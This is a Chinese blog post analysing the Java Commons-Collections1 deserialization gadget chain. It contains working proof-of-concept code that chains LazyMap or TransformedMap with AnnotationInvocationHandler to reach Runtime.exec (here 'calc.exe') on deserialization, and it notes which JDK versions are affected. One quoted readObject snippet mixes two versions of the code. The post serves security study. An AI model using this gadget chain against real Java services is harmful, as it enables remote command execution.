<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
        <title>Java安全之Commons-Collections1分析（二） | Mint Forge</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link rel='shortcut icon' href="/favicon.ico">
    
<link rel="stylesheet" href="/css/index.css">

    
<link rel="stylesheet" href="/css/plugins/highlight/dark.css">

    
<link rel="stylesheet" href="/css/plugins/iconfont/iconfont.css">

<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="kpa1on's Blog" type="application/atom+xml">
</head>
<body>
    <div class="navbar-container">
    <div class="navbar">
        <ul>
            <li><a href="/">MINT FORGE</a></li>
            <li><a href="/">首页</a></li>
            <li><a href='/categories'>分类</a></li>
            <li><a href="/tags">标签</a></li>
            <li><a href="/about">关于</a></li>
        </ul>
    </div>
</div>
    <div class="all-container">
        <div class="article-container">
    <h2 class="title">Java安全之Commons-Collections1分析（二）</h2>
    <span class="info">2022年4月24日</span>
    
    
        <div class="toc">
            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap"><span class="toc-number">1.</span> <span class="toc-text">LazyMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-number">2.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">POC分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
        </div>
    

    <div class="content"><meta name="referrer" content="no-referrer"/>

<p>继续接着上文，上文我们通过方法调用弹出了计算器，那么在反序列化的漏洞场景下该如何运用呢。</p>
<span id="more"></span>

<p>下面为完整的调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				Map(Proxy).entrySet()</span><br><span class="line">					AnnotationInvocationHandler.invoke()</span><br><span class="line">						LazyMap.get()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Class.getMethod()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.getRuntime()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.exec()</span><br></pre></td></tr></table></figure>

<h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>在分析调用链之前，先学习一下<code>LazyMap</code>，这个类和<code>TransformedMap</code>类似，都继承<code>AbstractMapDecorator</code>抽象类</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424181355248-164962512.png" alt="image-20220424181354526"></p>
<p>根据之前的分析，可以知道<code>TransformedMap</code>的触发点是put()方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put()-&gt;transformValue()-&gt;ChainedTransformer#transform()</span><br></pre></td></tr></table></figure>

<p>而<code>LazyMap</code>的触发点是在get()方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220424184102740-394006463.png" alt="image-20220424184103297"></p>
<p>get()方法的实现是首先判断map的中是否包含传入的key，当key不存在时，就会调用<code>transformerChain</code>的transform()方法。那么，我们根据这个触发点来编写如下poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">       //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">       Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">               new ConstantTransformer(Runtime.class),</span><br><span class="line">               new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">       Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       //创建Map并绑定transformerChina</span><br><span class="line">       Map innerMap = new HashMap();</span><br><span class="line">       innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">       </span><br><span class="line">       Map tmpmap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">       tmpmap.get(&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>运行完get()方法弹出计算器</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003117682-2015149661.png" alt="image-20220425003115659"></p>
<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>AnnotationInvocationHandler</code>类的构造函数有两个参数，第⼀个参数是⼀个Annotation类类型参数，该类是注解类，第二个是map类型参数。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003631092-1481504679.png" alt="image-20220425003629840"></p>
<p>所有的注解类型都继承自Annotation接口</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425003958204-372179627.png" alt="image-20220425003956842"></p>
<p>查看<code>AnnotationInvocationHandler#readObject</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425004348631-2058048733.png" alt="image-20220425004347242"></p>
<p>假设这里我们通过反射调用<code>AnnotationInvocationHandler</code>，并传入两个参数，一个是<code>Retention.class</code>，另一个是<code>outerMap</code>。<code>Retention</code>是一个注解类。<code>outerMap</code>是我们<code>TransformedMap</code>修饰过的类。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class  clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">    construct.setAccessible(true);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>

<p>这时候在 <code>AnnotationInvocationHandler</code>的<code>readObject</code>方法里面 <code>memberValues</code>就是我们使用反射传入的 <code>TransformedMap</code>的对象。代码中遍历了它的所有元素，并依次设置值。在调用<code>setValue</code>设置值的时候就会触发<code>TransformedMap</code>⾥的<code>Transform</code>方法，从而导致命令的执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">      // for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">           Object value = null;</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">               Object value = memberValue.getValue();</span><br><span class="line">               value = memberValue.getValue();</span><br><span class="line">                if (!(memberType.isInstance(value) ||</span><br><span class="line">                      value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                   memberValue.setValue(</span><br><span class="line">                       new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                   value = new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                               annotationType.members().get(name)));</span><br><span class="line">                               annotationType.members().get(name));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           mv.put(name, value);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        </span><br><span class="line">            Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">                            String.class,</span><br><span class="line">                            Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                            new Class[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">                            Object.class,</span><br><span class="line">                            Object[].class &#125;, new Object[] &#123; null, new</span><br><span class="line">                            Object[0] &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class</span><br><span class="line">                    &#125;,</span><br><span class="line">                            new String[] &#123;</span><br><span class="line">                                    &quot;calc.exe&quot; &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new</span><br><span class="line">                    ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">                    transformerChain);</span><br><span class="line">            Class clazz =</span><br><span class="line">                    Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor construct = clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                    Map.class);</span><br><span class="line">            construct.setAccessible(true);</span><br><span class="line">            InvocationHandler handler = (InvocationHandler)</span><br><span class="line">                    construct.newInstance(Retention.class, outerMap);</span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">            oos.close();</span><br><span class="line">            System.out.println(barr);</span><br><span class="line">            ObjectInputStream ois = new ObjectInputStream(new</span><br><span class="line">                    ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">            Object o = (Object)ois.readObject();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行弹出计算器</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425014904438-114576049.png" alt="image-20220425014902982"></p>
<p>测试过程发现，jdk1.8.0_321无法达到命令执行的目的，后面换了个jdk1.7.0_21才执行成功</p>
<p>在高版本中的<code>AnnotationInvocationHandler</code>的<code>readObject</code>是被改动过的，如下为低版本jdk</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425015123743-612622047.png" alt="image-20220425015122452"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/13791793.html">https://www.cnblogs.com/nice0e3/p/13791793.html</a></p>
</div>
    <hr>
    <div class="tags"></div>
</div>
<div class="paging">
    
    
        <a id="prev" href="/2022/04/25/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/">上一篇</a>
    
    
        <a id="next" href="/2022/03/31/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/">下一篇</a>
    
</div>
<div class="footer">
    <p><a href="/about/">转载前请联系作者</a></p>
</div>

<script src="/js/highlight.pack.js"></script>

</script>
<script>
	hljs.initHighlightingOnLoad();
</script>

<script src="/js/iconfont.js"></script>

<style>
    .icon {
      width: 1rem;
      height: 1rem;
      vertical-align: -0.15em;
      fill: currentColor;
      overflow: hidden;
    }
</style>
    
    </div>
    <div class='rights'>
	<p>©<span id='years'></span> Mint Forge. All Rights Reserved.</p>
</div>
<script type="text/javascript">
	var today = new Date()
	var years = today.getFullYear()
	document.getElementById('years').innerHTML=years
</script>
    
<script src="/js/iconfont.js"></script>

<style>
    .icon {
      width: 1rem;
      height: 1rem;
      vertical-align: -0.15em;
      fill: currentColor;
      overflow: hidden;
    }
</style>
    
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>